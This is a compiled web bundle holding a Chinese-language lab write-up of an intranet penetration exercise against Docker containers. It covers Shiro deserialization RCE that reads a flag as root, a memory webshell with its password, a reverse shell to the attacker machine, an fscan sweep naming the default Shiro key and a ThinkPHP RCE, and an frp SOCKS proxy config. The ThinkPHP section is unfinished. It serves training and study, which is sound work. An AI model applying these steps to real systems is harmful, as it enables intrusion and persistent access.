"use strict";(self.webpackChunktreasure_house=self.webpackChunktreasure_house||[]).push([[1896],{3658:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>a,default:()=>h,frontMatter:()=>s,metadata:()=>o,toc:()=>l});var r=t(5893),i=t(1151);const s={},a="Puff-Pastry WriteUp",o={id:"Penetration/Intranet-Penetration/Docker-CFS/Puff-Pastry/writeup",title:"Puff-Pastry WriteUp",description:"\u8fd9\u91cc WriteUp \u4f7f\u7528\u4e86 frp \u8fdb\u884c\u5185\u7f51\u4ee3\u7406\u642d\u5efa\uff0c\u5982\u679c\u4f7f\u7528\u5176\u4ed6\u5de5\u5177\uff0c\u8bf7\u81ea\u884c\u8c03\u6574",source:"@site/docs/Penetration/Intranet-Penetration/Docker-CFS/Puff-Pastry/writeup.md",sourceDirName:"Penetration/Intranet-Penetration/Docker-CFS/Puff-Pastry",slug:"/Penetration/Intranet-Penetration/Docker-CFS/Puff-Pastry/writeup",permalink:"/docs/Penetration/Intranet-Penetration/Docker-CFS/Puff-Pastry/writeup",draft:!1,unlisted:!1,editUrl:"https://github.com/Randark-JMT/Treasure-House/edit/main/docs/Penetration/Intranet-Penetration/Docker-CFS/Puff-Pastry/writeup.md",tags:[],version:"current",frontMatter:{},sidebar:"Penetration_Sidebar",previous:{title:"Puff-Pastry",permalink:"/docs/Penetration/Intranet-Penetration/Docker-CFS/Puff-Pastry/"},next:{title:"\u6743\u9650\u63d0\u5347",permalink:"/docs/Penetration/Privilege-Escalation/"}},c={},l=[{value:"web-shiro",id:"web-shiro",level:2},{value:"\u901a\u8fc7 Shiro remember \u53cd\u5e8f\u5217\u5316\u8fdb\u884c RCE \u653b\u51fb",id:"\u901a\u8fc7-shiro-remember-\u53cd\u5e8f\u5217\u5316\u8fdb\u884c-rce-\u653b\u51fb",level:3},{value:"\u5185\u7f51\u6a2a\u5411",id:"\u5185\u7f51\u6a2a\u5411",level:3},{value:"web-thinkphp",id:"web-thinkphp",level:2}];function p(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,i.a)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h1,{id:"puff-pastry-writeup",children:"Puff-Pastry WriteUp"}),"\n",(0,r.jsx)(n.admonition,{title:"\u5185\u7f51\u5de5\u5177",type:"info",children:(0,r.jsx)(n.p,{children:"\u8fd9\u91cc WriteUp \u4f7f\u7528\u4e86 frp \u8fdb\u884c\u5185\u7f51\u4ee3\u7406\u642d\u5efa\uff0c\u5982\u679c\u4f7f\u7528\u5176\u4ed6\u5de5\u5177\uff0c\u8bf7\u81ea\u884c\u8c03\u6574"})}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u9776\u573a\u90e8\u7f72\u5b8c\u6210\u540e\uff0c\u8bbf\u95ee\u5bbf\u4e3b\u673a\u7684 8080 \u7aef\u53e3\uff0c\u5e94\u8be5\u53ef\u4ee5\u8bbf\u95ee\u5230\u7ad9\u70b9\uff1a"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Shiro site",src:t(4215).Z+"",width:"1185",height:"863"})}),"\n",(0,r.jsx)(n.h2,{id:"web-shiro",children:"web-shiro"}),"\n",(0,r.jsx)(n.p,{children:"\u4f7f\u7528 Shiro \u53cd\u5e8f\u5217\u5316\u5de5\u5177\u8fdb\u884c\u626b\u63cf\u63a2\u6d4b\uff0c\u53d1\u73b0\u53ef\u4ee5\u53d1\u8d77\u653b\u51fb"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Shiro attack check",src:t(7627).Z+"",width:"1002",height:"832"})}),"\n",(0,r.jsx)(n.h3,{id:"\u901a\u8fc7-shiro-remember-\u53cd\u5e8f\u5217\u5316\u8fdb\u884c-rce-\u653b\u51fb",children:"\u901a\u8fc7 Shiro remember \u53cd\u5e8f\u5217\u5316\u8fdb\u884c RCE \u653b\u51fb"}),"\n",(0,r.jsx)(n.p,{children:"\u76f4\u63a5\u4f7f\u7528\u5de5\u5177\u6267\u884c\u6307\u4ee4\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"$ whoami;cat /flag.txt\n\nroot\nWSS-Studio{Shiro-ad45528d-3341-41bc-8e68-7eb5b33e961c}\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5e76\u6ce8\u5165\u5185\u5b58\u9a6c"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Shiro attack webshell",src:t(798).Z+"",width:"1002",height:"655"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"\u8681\u5251 [Servlet]  \u6ce8\u5165\u6210\u529f!\n\u8def\u5f84\uff1ahttp://192.168.163.128:8080/favicondemo.ico\n\u5bc6\u7801\uff1apass1024\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4f7f\u7528\u8681\u5251\u8fdb\u884c\u8fde\u63a5\uff0c\u786e\u8ba4 webshell \u5de5\u4f5c\u6b63\u5e38"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Shiro AntSword check success",src:t(3707).Z+"",width:"1042",height:"731"})}),"\n",(0,r.jsx)(n.p,{children:"\u76f4\u63a5\u4f7f\u7528 As-Exploits \u53cd\u5f39 shell \u5230\u653b\u51fb\u673a\uff0c\u501f\u52a9 pwncat-cs \u6301\u4e45\u5316\u83b7\u5f97 shell"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Shiro AntSword Reverse Shell",src:t(2978).Z+"",width:"1042",height:"731"})}),"\n",(0,r.jsx)(n.p,{children:"pwncat-cs \u6210\u529f\u5f97\u5230\u53cd\u5f39\u7684 shell\uff0c\u5f7b\u5e95\u62ff\u4e0b web-shiro"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Shiro Pwncat-cs success",src:t(6233).Z+"",width:"1449",height:"884"})}),"\n",(0,r.jsx)(n.h3,{id:"\u5185\u7f51\u6a2a\u5411",children:"\u5185\u7f51\u6a2a\u5411"}),"\n",(0,r.jsx)(n.p,{children:"\u83b7\u53d6\u5f53\u524d\u5bb9\u5668\u7684\u7f51\u7edc\u4fe1\u606f"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.100.2  netmask 255.255.255.0  broadcast 192.168.100.255\n        ether 02:42:c0:a8:64:02  txqueuelen 0  (Ethernet)\n        RX packets 8332  bytes 21683368 (20.6 MiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 8718  bytes 1498028 (1.4 MiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 9528  bytes 3199568 (3.0 MiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 9528  bytes 3199568 (3.0 MiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4f7f\u7528 fscan\uff0c\u8fdb\u884c\u5185\u7f51\u626b\u63cf"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"[*] WebTitle: http://192.168.100.2:8080 code:302 len:0      title:None \u8df3\u8f6curl: http://192.168.100.2:8080/login;jsessionid=0E710FB1776734553142BAD69EC52670\n[*] WebTitle: http://192.168.100.3      code:200 len:931    title:None\n[*] WebTitle: http://192.168.100.2:8080/login;jsessionid=0E710FB1776734553142BAD69EC52670 code:200 len:2608   title:Login Page\n[*] WebTitle: https://192.168.100.1:9443 code:200 len:18201  title:Portainer\n[*] WebTitle: http://192.168.100.1:8080 code:302 len:0      title:None \u8df3\u8f6curl: http://192.168.100.1:8080/login;jsessionid=12A9CF68B8FCAFCD9C2BE709E3C95D60\n[*] WebTitle: http://192.168.100.1:9000 code:200 len:18201  title:Portainer\n[*] WebTitle: http://192.168.100.1:8080/login;jsessionid=12A9CF68B8FCAFCD9C2BE709E3C95D60 code:200 len:2608   title:Login Page\n[+] InfoScan:https://192.168.100.1:9443 [Portainer(Docker\u7ba1\u7406)] \n[+] InfoScan:http://192.168.100.1:9000 [Portainer(Docker\u7ba1\u7406)] \n[+] http://192.168.100.3 poc-yaml-php-cgi-cve-2012-1823 \n[+] http://192.168.100.1:8080/ poc-yaml-shiro-key [{key kPH+bIxk5D2deZiIxcaaaA==} {mode cbc}]\n[+] http://192.168.100.2:8080/ poc-yaml-shiro-key [{key kPH+bIxk5D2deZiIxcaaaA==} {mode cbc}]\n[+] http://192.168.100.3 poc-yaml-thinkphp5023-method-rce poc1\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u83b7\u5f97\u4e0b\u4e00\u4e2a\u5bb9\u5668\u7684\u6f0f\u6d1e\u4fe1\u606f\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"http://192.168.100.3 poc-yaml-thinkphp5023-method-rce poc1\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4e0a\u4f20 frp \u540e\uff0c\u642d\u5efa\u4ee3\u7406"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-ini",children:"# frpc.ini\n[common]\nserver_addr = 192.168.163.133\nserver_port = 10000\n\n[socks1]\ntype = tcp\nremote_port = 11000\nplugin = socks5\nplugin_user = admin\nplugin_passwd = password\nuse_encryption = true\nuse_compression = true\n\n[portforward]\ntype = tcp\nlocal_ip = 127.0.0.1\nremote_port = 6000\nlocal_port = 20000\n"})}),"\n",(0,r.jsx)(n.h2,{id:"web-thinkphp",children:"web-thinkphp"}),"\n",(0,r.jsx)(n.p,{children:"\u901a\u8fc7\u4ee3\u7406\uff0c\u6210\u529f\u8bbf\u95ee\u5230 web-thinkphp \u7684\u7ad9\u70b9"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Thinkphp site",src:t(7422).Z+"",width:"1257",height:"832"})}),"\n",(0,r.jsx)(n.p,{children:"\u4f7f\u7528 ThinkPHP RCE \u5de5\u5177\u8fdb\u884c\u653b\u51fb"}),"\n",(0,r.jsx)(n.p,{children:"TODO \u6ca1\u5199\u5b8c"})]})}function h(e={}){const{wrapper:n}={...(0,i.a)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(p,{...e})}):p(e)}},7422:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/image_20231112-221210-b030bbecf437c3fd429f6af6ae103553.png"},4215:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/image_20231133-213348-7138b345457f06b9800e677bfefac5c6.png"},7627:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/image_20231136-213632-01b71021d1ed72158cca24874c9c01bd.png"},798:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/image_20231142-214203-07d75ca039bef50082761ec827decd7d.png"},3707:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/image_20231148-214827-3eb9116cbb727ba8b06378b4146b9504.png"},2978:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/image_20231150-215059-211f742d81d347c68f2a6bbbb8bf70f4.png"},6233:(e,n,t)=>{t.d(n,{Z:()=>r});const r=t.p+"assets/images/image_20231152-215204-baa02adfeacfd468bb4640765f7a4b5f.png"},1151:(e,n,t)=>{t.d(n,{Z:()=>o,a:()=>a});var r=t(7294);const i={},s=r.createContext(i);function a(e){const n=r.useContext(s);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),r.createElement(s.Provider,{value:n},e.children)}}}]);